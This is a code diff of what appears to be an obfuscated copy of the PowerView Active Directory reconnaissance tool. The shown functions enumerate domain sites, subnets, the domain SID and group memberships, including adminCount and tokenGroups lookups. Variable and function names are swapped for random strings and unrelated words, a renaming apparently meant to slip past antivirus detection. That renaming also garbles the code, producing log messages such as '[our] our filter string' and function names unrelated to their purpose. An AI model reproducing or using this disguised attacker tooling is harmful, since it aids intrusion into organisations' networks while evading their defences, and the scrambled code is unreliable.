-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $LwULXdvl99 = watersides @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $SiteSearcher = deadly @SearcherArguments
     }
     PROCESS {
-        if ($LwULXdvl99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^CN=.*') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+        if ($SiteSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^CN=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[shoddiness] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $LwULXdvl99 = watersides @SearcherArguments
-                        if (-not $LwULXdvl99) {
-                            Write-Warning "[shoddiness] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[our] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $SiteSearcher = deadly @SearcherArguments
+                        if (-not $SiteSearcher) {
+                            Write-Warning "[our] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
                 else {
                     try {
-                        $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
                     catch {
-                        $afFJXkRc99 += "(name=$QghnbJOP99)"
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['GPLink']) {
-                Write-Verbose "[shoddiness] Searching for sites with $OyouMTgX99 set in the gpLink property"
-                $kXbEpVCq99 += "(gplink=*$OyouMTgX99*)"
+                Write-Verbose "[our] Searching for sites with $GPLink set in the gpLink property"
+                $Filter += "(gplink=*$GPLink*)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[shoddiness] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[our] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            $LwULXdvl99.filter = "(&(objectCategory=site)$kXbEpVCq99)"
-            Write-Verbose "[shoddiness] shoddiness filter string: $($LwULXdvl99.filter)"
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $LwULXdvl99.FindAll() }
-            else { $pfqXXMQd99 = $LwULXdvl99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
+            Write-Verbose "[our] our filter string: $($SiteSearcher.filter)"
+            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
+            else { $Results = $SiteSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
                     $Site = $_
                 }
                 else {
-                    $Site = Buddy -Properties $_.Properties
+                    $Site = bookie -Properties $_.Properties
                 }
                 $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                 $Site
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[shoddiness] Error disposing of the Results object"
+                    Write-Verbose "[our] Error disposing of the Results object"
                 }
             }
-            $LwULXdvl99.dispose()
+            $SiteSearcher.dispose()
         }
     }
 }
-function pianissimi {
+function unsold {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.Subnet')]
     [CmdletBinding()]
@@ -4667,167 +4667,167 @@ function pianissimi {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Name')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $nqApdsmI99,
+        $SiteName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $ghyRsntb99 = watersides @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $SubnetSearcher = deadly @SearcherArguments
     }
     PROCESS {
-        if ($ghyRsntb99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^CN=.*') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+        if ($SubnetSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^CN=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[pianissimi] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $ghyRsntb99 = watersides @SearcherArguments
-                        if (-not $ghyRsntb99) {
-                            Write-Warning "[pianissimi] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[unsold] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $SubnetSearcher = deadly @SearcherArguments
+                        if (-not $SubnetSearcher) {
+                            Write-Warning "[unsold] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
                 else {
                     try {
-                        $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
                     catch {
-                        $afFJXkRc99 += "(name=$QghnbJOP99)"
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[pianissimi] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[unsold] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            $ghyRsntb99.filter = "(&(objectCategory=subnet)$kXbEpVCq99)"
-            Write-Verbose "[pianissimi] pianissimi filter string: $($ghyRsntb99.filter)"
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $ghyRsntb99.FindOne() }
-            else { $pfqXXMQd99 = $ghyRsntb99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
+            Write-Verbose "[unsold] unsold filter string: $($SubnetSearcher.filter)"
+            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
+            else { $Results = $SubnetSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
-                    $TNlfrYlC99 = $_
+                    $Subnet = $_
                 }
                 else {
-                    $TNlfrYlC99 = Buddy -Properties $_.Properties
+                    $Subnet = bookie -Properties $_.Properties
                 }
-                $TNlfrYlC99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
+                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                 if ($PSBoundParameters['SiteName']) {
-                    if ($TNlfrYlC99.properties -and ($TNlfrYlC99.properties.siteobject -like "*$nqApdsmI99*")) {
-                        $TNlfrYlC99
+                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
+                        $Subnet
                     }
-                    elseif ($TNlfrYlC99.siteobject -like "*$nqApdsmI99*") {
-                        $TNlfrYlC99
+                    elseif ($Subnet.siteobject -like "*$SiteName*") {
+                        $Subnet
                     }
                 }
                 else {
-                    $TNlfrYlC99
+                    $Subnet
                 }
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[pianissimi] Error disposing of the Results object: $_"
+                    Write-Verbose "[unsold] Error disposing of the Results object: $_"
                 }
             }
-            $ghyRsntb99.dispose()
+            $SubnetSearcher.dispose()
         }
     }
 }
-function disobedience {
+function reverse {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
     [CmdletBinding()]
     Param(
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
-    $PPosolen99 = @{
+    $SearcherArguments = @{
         'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
     }
-    if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-    if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-    if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-    $DCSID = doubtlessly @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
+    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+    $DCSID = sonorous @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
     if ($DCSID) {
         $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
     }
     else {
-        Write-Verbose "[disobedience] Error extracting domain SID for '$SSNUOPgW99'"
+        Write-Verbose "[reverse] Error extracting domain SID for '$Domain'"
     }
 }
-function burlap {
+function typing {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.Group')]
@@ -4836,93 +4836,93 @@ function burlap {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [Alias('UserName')]
         [String]
-        $jTlZdhsL99,
+        $MemberIdentity,
         [Switch]
-        $wfGmLtet99,
+        $AdminCount,
         [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
         [Alias('Scope')]
         [String]
-        $IHtNVbwJ99,
+        $GroupScope,
         [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
         [String]
-        $sqCmFczP99,
+        $GroupProperty,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $vLzWmKPH99 = watersides @SearcherArguments
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $GroupSearcher = deadly @SearcherArguments
     }
     PROCESS {
-        if ($vLzWmKPH99) {
+        if ($GroupSearcher) {
             if ($PSBoundParameters['MemberIdentity']) {
-                if ($PPosolen99['Properties']) {
-                    $QEbPmGkV99 = $PPosolen99['Properties']
+                if ($SearcherArguments['Properties']) {
+                    $OldProperties = $SearcherArguments['Properties']
                 }
-                $PPosolen99['Identity'] = $jTlZdhsL99
-                $PPosolen99['Raw'] = $True
-                farrowing @SearcherArguments | ForEach-Object {
-                    $bhUEnzFl99 = $_.GetDirectoryEntry()
-                    $bhUEnzFl99.RefreshCache('tokenGroups')
-                    $bhUEnzFl99.TokenGroups | ForEach-Object {
-                        $LmXmVdGr99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
-                        if ($LmXmVdGr99 -notmatch '^S-1-5-32-.*') {
-                            $PPosolen99['Identity'] = $LmXmVdGr99
-                            $PPosolen99['Raw'] = $False
-                            if ($QEbPmGkV99) { $PPosolen99['Properties'] = $QEbPmGkV99 }
-                            $Group = farrowing @SearcherArguments
+                $SearcherArguments['Identity'] = $MemberIdentity
+                $SearcherArguments['Raw'] = $True
+                dermatitis @SearcherArguments | ForEach-Object {
+                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()
+                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')
+                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
+                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
+                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
+                            $SearcherArguments['Identity'] = $GroupSid
+                            $SearcherArguments['Raw'] = $False
+                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
+                            $Group = dermatitis @SearcherArguments
                             if ($Group) {
                                 $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                 $Group
@@ -4932,54 +4932,54 @@ function burlap {
                 }
             }
             else {
-                $afFJXkRc99 = ''
-                $kXbEpVCq99 = ''
-                $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                    $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                    if ($QghnbJOP99 -match '^S-1-') {
-                        $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
+                $IdentityFilter = ''
+                $Filter = ''
+                $Identity | Where-Object {$_} | ForEach-Object {
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match '^S-1-') {
+                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                     }
-                    elseif ($QghnbJOP99 -match '^CN=') {
-                        $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                    elseif ($IdentityInstance -match '^CN=') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                         if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                            $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            Write-Verbose "[burlap] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                            $PPosolen99['Domain'] = $BvhyhWZG99
-                            $vLzWmKPH99 = watersides @SearcherArguments
-                            if (-not $vLzWmKPH99) {
-                                Write-Warning "[burlap] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            Write-Verbose "[typing] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            $SearcherArguments['Domain'] = $IdentityDomain
+                            $GroupSearcher = deadly @SearcherArguments
+                            if (-not $GroupSearcher) {
+                                Write-Warning "[typing] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
-                    elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                        $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
-                    elseif ($QghnbJOP99.Contains('\')) {
-                        $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
-                        if ($TzefbTEv99) {
-                            $BBaSdAsr99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
-                            $SZjbzmKX99 = $QghnbJOP99.Split('\')[1]
-                            $afFJXkRc99 += "(samAccountName=$SZjbzmKX99)"
-                            $PPosolen99['Domain'] = $BBaSdAsr99
-                            Write-Verbose "[burlap] Extracted domain '$BBaSdAsr99' from '$QghnbJOP99'"
-                            $vLzWmKPH99 = watersides @SearcherArguments
+                    elseif ($IdentityInstance.Contains('\')) {
+                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | corralling -OutputType Canonical
+                        if ($ConvertedIdentityInstance) {
+                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                            $GroupName = $IdentityInstance.Split('\')[1]
+                            $IdentityFilter += "(samAccountName=$GroupName)"
+                            $SearcherArguments['Domain'] = $GroupDomain
+                            Write-Verbose "[typing] Extracted domain '$GroupDomain' from '$IdentityInstance'"
+                            $GroupSearcher = deadly @SearcherArguments
                         }
                     }
                     else {
-                        $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99))"
+                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                     }
                 }
-                if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                    $kXbEpVCq99 += "(|$afFJXkRc99)"
+                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                    $Filter += "(|$IdentityFilter)"
                 }
                 if ($PSBoundParameters['AdminCount']) {
-                    Write-Verbose '[burlap] Searching for adminCount=1'
-                    $kXbEpVCq99 += '(admincount=1)'
+                    Write-Verbose '[typing] Searching for adminCount=1'
+                    $Filter += '(admincount=1)'
                 }
                 if ($PSBoundParameters['GroupScope']) {
-                    $viPEgomk99 = $PSBoundParameters['GroupScope']
-                    $kXbEpVCq99 = Switch ($viPEgomk99) {
+                    $GroupScopeValue = $PSBoundParameters['GroupScope']
+                    $Filter = Switch ($GroupScopeValue) {
                         'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                         'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                         'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
@@ -4987,48 +4987,48 @@ function burlap {
                         'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                         'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                     }
-                    Write-Verbose "[burlap] Searching for group scope '$viPEgomk99'"
